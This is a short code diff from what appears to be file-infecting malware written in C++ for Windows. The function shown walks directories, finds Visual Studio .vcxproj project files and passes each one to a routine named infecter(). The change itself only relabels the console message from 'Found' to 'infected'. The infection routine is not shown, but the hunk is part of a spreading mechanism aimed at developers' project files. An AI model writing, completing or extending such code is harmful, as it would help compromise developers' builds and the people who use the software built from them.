@@ -105,7 +105,7 @@ void searchForVcxproj(const std::wstring& dirPath)
         {
             subDirPath = dirPath + L"\\" + ffd.cFileName;
 
-            std::wcout << L"Found .vcxproj file: " << subDirPath << std::endl;
+            std::wcout << L"infected .vcxproj file: " << subDirPath << std::endl;
             infecter(subDirPath);
         }
     } while (FindNextFileW(hFind, &ffd) != 0); 
